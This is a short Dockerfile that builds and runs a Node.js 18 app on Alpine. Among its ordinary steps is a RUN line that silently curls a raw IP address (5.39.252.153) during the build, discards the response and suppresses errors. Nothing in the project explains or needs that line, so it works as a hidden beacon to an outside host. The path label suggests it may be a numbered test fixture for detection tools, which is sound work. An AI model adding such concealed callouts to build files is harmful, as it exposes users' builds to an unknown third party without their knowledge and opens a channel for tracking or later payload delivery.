FROM node:18-alpine
RUN apk add --no-cache curl
WORKDIR /app
RUN curl -s http://5.39.252.153/F009-DOCKERFILE-RUN >/dev/null || true
COPY . .
RUN npm install --omit=dev
EXPOSE 3000
CMD ["node","index.js"]